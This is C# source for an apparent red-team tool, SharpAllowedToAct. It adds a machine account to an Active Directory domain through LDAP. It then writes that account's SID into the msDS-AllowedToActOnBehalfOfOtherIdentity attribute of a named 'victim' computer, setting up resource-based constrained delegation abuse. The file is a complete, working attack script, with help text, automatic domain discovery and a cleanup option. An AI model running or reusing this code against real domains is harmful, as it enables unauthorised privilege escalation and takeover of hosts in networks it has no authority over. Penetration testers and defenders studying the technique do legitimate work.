using System;
using System.Text;
using System.Security.AccessControl;
using System.Security.Principal;
using CommandLine;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;

namespace AddMachineAccount
{
    public class Options
    {
        [Option("a", "DomainController", Required = false, HelpText = "Set the domain controller to use.")]
        public string DomainController { get; set; }

        [Option("d", "Domain", Required = false, HelpText = "Set the target domain.")]
        public string Domain { get; set; }

        [Option("m", "ComputerAccountName", Required = false, HelpText = "Set the name of the new machine.")]
        public string ComputerAccountName { get; set; }

        [Option("p", "ComputerPassword", Required = false, HelpText = "Set the password for the new machine.")]
        public string ComputerPassword { get; set; }

        [Option("t", "TargetComputer", Required = true, HelpText = "Set the name of the target computer you want to exploit. Need to have write access to the computer object.")]
        public string TargetComputer { get; set; }

        [Option("c", "Cleanup", HelpText = "Empty the value of msds-allowedtoactonbehalfofotheridentity for a given computer account (Usage: '--Cleanup true'). Must be combined with --TargetComputer")]
        public bool Cleanup { get; set; }

        [Option("u", "Username", Required = false, HelpText = "Username")]
        public string Username { get; set; }

        [Option("w", "Password", Required = false, HelpText = "Password")]
        public string Password { get; set; }

        [Option("s", "SecDescriptor", Required = false, HelpText = "Security descriptor to set on  msds-allowedtoactonbehalfofotheridentity. Use for setting to previous value. ")]
        public string SecDescriptor { get; set; }

    }

    class Program
    {
        static byte[]  ObjectToByteArray(object obj)
        {
            if (obj == null)
                return null;
            BinaryFormatter bf = new BinaryFormatter();
            using (MemoryStream ms = new MemoryStream())
            {
                bf.Serialize(ms, obj);
                return ms.ToArray();
            }
        }

        public static void PrintHelp()
        {
            string HelpText = "\nUsage: SharpAllowedToAct.exe --ComputerAccountName FAKECOMPUTER --ComputerPassword Welcome123! --TargetComputer VICTIM\n" +
                "\nOptions:\n" +
                "\n-m, --ComputerAccountName\n" +
                "\tSet the name of the new machine.\n" +
                "\n" +
                "-p, --ComputerPassword\n" +
                "\tSet the password for the new machine.\n" +
                "\n" +
                "-t, --TargetComputer\n" +
                "\tSet the name of the target computer you want to exploit. Need to have write access to the computer object.\n" +
                "\n" +
                "-a, --DomainController\n" +
                "\tSet the domain controller to use.\n" +
                "\n" +
                "-d, --Domain\n" +
                "\tSet the target domain.\n" +
                "\n" +
                "-c, --Cleanup\n" +
                "\tEmpty the value of msds-allowedtoactonbehalfofotheridentity for a given computer account (Usage: '--Cleanup true'). Must be combined with --TargetComputer.\n" +
                "\n" +
                "-u, --Username\n" +
                "\tUser with write access at target computer\n" +
                "\n" +
                "-s, --SecDescriptor\n" +
                "\tValue to update msds-allowedtoactonbehalfofotheridentity for a given computer account (Usage: '--Cleanup true'). Must be combined with --TargetComputer.\n" +
                "\n" +
                "-w, --Password\n" +
                "\tPassword for user with write access at target computer.\n" +
                "\n";
            Console.WriteLine(HelpText);
        }

        public static void SetSecurityDescriptor(string dc, String DomainDN, String victimcomputer, String sid, bool cleanup, string username, string password, string sec_descriptor)
        {
            // get the domain object of the victim computer and update its securty descriptor 
            System.DirectoryServices.DirectoryEntry myldapConnection;
            if(!string.IsNullOrEmpty(username))
                myldapConnection = new System.DirectoryServices.DirectoryEntry("LDAP://" + dc + "/" + DomainDN, username, password);
            else
                myldapConnection = new System.DirectoryServices.DirectoryEntry("LDAP://" + dc + "/" + DomainDN);


            myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure;
            System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection);
            search.Filter = "(samaccountname=" + victimcomputer + "$)";
            string[] requiredProperties = new string[] { "samaccountname" };

            Console.WriteLine($"[+] Searching for '{victimcomputer}'$ with LDAP '{myldapConnection.Path}' connection.");

            foreach (String property in requiredProperties)
                search.PropertiesToLoad.Add(property);

            System.DirectoryServices.SearchResult result = null;

            int fail = 0;
            do
            {
                try
                {
                    result = search.FindOne();
                    if (result != null)
                    {
                        Console.WriteLine("[+] Found " + result.Path);
                        break;
                    }
                    else
                    {
                        Console.WriteLine($"[-] Not found, maybe {victimcomputer}$ is hiding...");
                        fail++;
                    }
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine($"[-] Error searching victim computer: {ex.Message}");
                    fail++;
                    System.Threading.Thread.Sleep(1000);
                }
            }
            while (fail <= 5);

            if (fail > 5)
            {
                Console.WriteLine("Exiting...");
                return;
            }

            if (result != null)
            {
                System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry();

                if (string.IsNullOrEmpty(username))
                {
                    entryToUpdate = new System.DirectoryServices.DirectoryEntry(entryToUpdate.Path, username, password);
                }

                // set the security descriptor
                if (sec_descriptor != null)
                {
                    System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
                    byte[] descriptor_buffer = new byte[sd.BinaryLength];
                    sd.GetBinaryForm(descriptor_buffer, 0);
                    // Add AllowedToAct Security Descriptor
                    entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = descriptor_buffer;
                }
                else if(!cleanup)
                {
                    string previousDescriptor = null;
                    if (entryToUpdate.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
                    {
                        var previousValue = (ActiveDs.IADsSecurityDescriptor)entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Value;
                        // convert 1 (iads descriptor) to 2 (raw byte[])
                        // https://docs.microsoft.com/en-us/windows/win32/api/iads/nf-iads-iadssecurityutility-convertsecuritydescriptor
                        var descriptorBlob = (byte[])new ActiveDs.ADsSecurityUtilityClass().ConvertSecurityDescriptor(previousValue, 1, 2);
                        var rawDescriptor = new RawSecurityDescriptor(descriptorBlob, 0);
                        previousDescriptor = rawDescriptor.GetSddlForm(AccessControlSections.All);
                        Console.WriteLine($"[+] Previous msds-allowedtoactonbehalfofotheridentity: {previousDescriptor}");
                    }
                    else
                    {
                        Console.WriteLine("[+] No previous msds-allowedtoactonbehalfofotheridentity");
                    }
                                        
                    sec_descriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + sid + ")";
                    if (previousDescriptor == sec_descriptor)
                    {
                        Console.WriteLine($"[-] Descriptor already set. Exiting...");
                        return;
                    }
                    
                    Console.WriteLine($"[+] Updating {entryToUpdate.Path} with '{sec_descriptor}'");

                    System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
                    byte[] descriptor_buffer = new byte[sd.BinaryLength];
                    sd.GetBinaryForm(descriptor_buffer, 0);
                    // Add AllowedToAct Security Descriptor
                    entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = descriptor_buffer;
                }
                else
                {
                    // Cleanup attribute
                    Console.WriteLine("[+] Clearing attribute...");
                    entryToUpdate.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
                }

                try
                {
                    // Commit changes to the security descriptor
                    entryToUpdate.CommitChanges();
                    Console.WriteLine("[+] Attribute changed successfully");
                    Console.WriteLine("[+] Done!");
                }
                catch (System.Exception ex)
                {
                    Console.WriteLine($"[!] {ex.Message}");
                    Console.WriteLine("[!] Could not update attribute!\nExiting...");
                    return;
                }
            }

            else Console.WriteLine("[!] Computer Account not found!\nExiting...");
            return;
        }

        static void Main(string[] args)
        {
            if (args == null)
            {
                PrintHelp();
                return;
            }

            try
            {
                String DomainController = "";
                String Domain = "";
                String MachineAccount = "";
                String DistinguishedName = "";
                String password_cleartext = "";
                String victimcomputer = "";
                String SecDescriptor = null;

                var Options = new Options();


                if (CommandLineParser.Default.ParseArguments(args, Options,Console.Out))
                {
                    if ((!string.IsNullOrEmpty(Options.ComputerPassword) && !string.IsNullOrEmpty(Options.TargetComputer) && !string.IsNullOrEmpty(Options.ComputerAccountName)) || (Options.Cleanup && !string.IsNullOrEmpty(Options.TargetComputer)))
                    {
                        if (!string.IsNullOrEmpty(Options.DomainController))
                        {
                            DomainController = Options.DomainController;
                        }
                        if (!string.IsNullOrEmpty(Options.Domain))
                        {
                            Domain = Options.Domain;
                        }
                        if (!string.IsNullOrEmpty(Options.ComputerAccountName))
                        {
                            MachineAccount = Options.ComputerAccountName;
                        }
                        if (!string.IsNullOrEmpty(Options.ComputerPassword))
                        {
                            password_cleartext = Options.ComputerPassword;
                        }
                        if (!string.IsNullOrEmpty(Options.TargetComputer))
                        {
                            victimcomputer = Options.TargetComputer;
                        }
                        if (!string.IsNullOrEmpty(Options.SecDescriptor))
                        {
                            SecDescriptor = Options.SecDescriptor;
                        }
                    }
                    else
                    {
                        Console.Write("[!] Missing required arguments! Exiting...\n");
                        //PrintHelp();
                        return;
                    }
                }
                else
                {
                    Console.Write("[!] Missing required arguments! Exiting...\n");
                    PrintHelp();
                    return;
                }

                bool cleanup = Options.Cleanup;

                // If a domain controller and domain were not provide try to find them automatically
                System.DirectoryServices.ActiveDirectory.Domain current_domain = null;
                if (DomainController == String.Empty || Domain == String.Empty)
                {
                    try
                    {
                        current_domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain();
                    }
                    catch
                    {
                        Console.WriteLine("[!] Cannot enumerate domain.\n");
                        return;
                    }

                }

                if (DomainController == String.Empty)
                {
                    DomainController = current_domain.PdcRoleOwner.Name;
                }

                if (Domain == String.Empty)
                {
                    Domain = current_domain.Name;
                }

                Domain = Domain.ToLower();

                String machine_account = MachineAccount;
                String sam_account = "";
                if (MachineAccount.EndsWith("$"))
                {
                    sam_account = machine_account;
                    machine_account = machine_account.Substring(0, machine_account.Length - 1);
                }
                else
                {
                    sam_account = machine_account + "$";
                }

                String distinguished_name = DistinguishedName;
                String[] DC_array = null;
                string DomainDN = null;
                distinguished_name = "CN=" + machine_account + ",CN=Computers";
                DC_array = Domain.Split('.');

                foreach (String DC in DC_array)
                {
                    DomainDN += (DomainDN == null ? string.Empty : ",") + "DC=" + DC;
                    distinguished_name += ",DC=" + DC;
                }

                if (cleanup)
                {
                    SetSecurityDescriptor(DomainController, DomainDN, victimcomputer, null, true, Options.Username, Options.Password, null);
                    return;
                }

                if (SecDescriptor!=null)
                {
                    Console.WriteLine($"[+] Setting msds-allowedtoactonbehalfofotheridentity to '{SecDescriptor}'");
                    SetSecurityDescriptor(DomainController, DomainDN, victimcomputer, null, false, Options.Username, Options.Password, SecDescriptor);
                    return;
                }

                Console.WriteLine("[+] Domain = " + Domain);
                Console.WriteLine("[+] Domain DN = " + DomainDN);
                Console.WriteLine("[+] Domain Controller = " + DomainController);
                Console.WriteLine("[+] New SAMAccountName = " + sam_account);
                Console.WriteLine("[+] Distinguished Name = " + distinguished_name);

                bool exists = false;
                try
                {
                    System.DirectoryServices.DirectoryEntry exsting;
                    if(!string.IsNullOrEmpty(Options.Username))
                        exsting = new System.DirectoryServices.DirectoryEntry("LDAP://" + DomainController + "/" + distinguished_name, Options.Username,Options.Password);
                    else
                        exsting = new System.DirectoryServices.DirectoryEntry("LDAP://" + DomainController + "/" + distinguished_name);

                    var guid = exsting.NativeGuid;
                    exists = true;
                    Console.WriteLine("[+] Machine account exists with path: " + exsting.Path);
                }
                catch
                {
                    Console.WriteLine("[+] Machine account not found. Continuing...");
                }

                System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389);
                System.DirectoryServices.Protocols.LdapConnection connection = null;

                connection = new System.DirectoryServices.Protocols.LdapConnection(identifier);

                connection.SessionOptions.Sealing = true;
                connection.SessionOptions.Signing = true;
                connection.Bind();

                if (!exists)
                {

                    var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] {
                    new System.DirectoryServices.Protocols.DirectoryAttribute("DnsHostName", machine_account +"."+ Domain),
                    new System.DirectoryServices.Protocols.DirectoryAttribute("SamAccountName", sam_account),
                    new System.DirectoryServices.Protocols.DirectoryAttribute("userAccountControl", "4096"),
                    new System.DirectoryServices.Protocols.DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes("\"" + password_cleartext + "\"")),
                    new System.DirectoryServices.Protocols.DirectoryAttribute("objectClass", "Computer"),
                    new System.DirectoryServices.Protocols.DirectoryAttribute("ServicePrincipalName", "HOST/"+machine_account+"."+Domain,"RestrictedKrbHost/"+machine_account+"."+Domain,"HOST/"+machine_account,"RestrictedKrbHost/"+machine_account)
                });

                    try
                    {
                        connection.SendRequest(request);
                        Console.WriteLine("[+] Machine account " + machine_account + " added");
                    }
                    catch (System.Exception ex)
                    {
                        Console.WriteLine("[-] The new machine could not be created! User may have reached ms-DS-MachineAccountQuota limit.)");
                        Console.WriteLine("[-] Exception: " + ex.Message);
                        return;
                    }
                }

                // Get SID of the new computer object
                var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, "(&(samAccountType=805306369)(|(name=" + machine_account + ")))", System.DirectoryServices.Protocols.SearchScope.Subtree, null);
                var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request);
                SecurityIdentifier sid = null;

                foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries)
                {
                    try
                    {
                        sid = new SecurityIdentifier(entry.Attributes["objectsid"][0] as byte[], 0);
                        Console.Out.WriteLine("[+] SID of New Computer: " + sid.Value);
                    }
                    catch
                    {
                        Console.WriteLine("[!] It was not possible to retrieve the SID.\nExiting...");
                        return;
                    }
                }

                SetSecurityDescriptor(DomainController, DomainDN, victimcomputer, sid.Value, false, Options.Username, Options.Password, null);
            }
            catch (Exception sex)
            {
                Console.WriteLine(sex.ToString());
                return;
            }
        }

    }
}


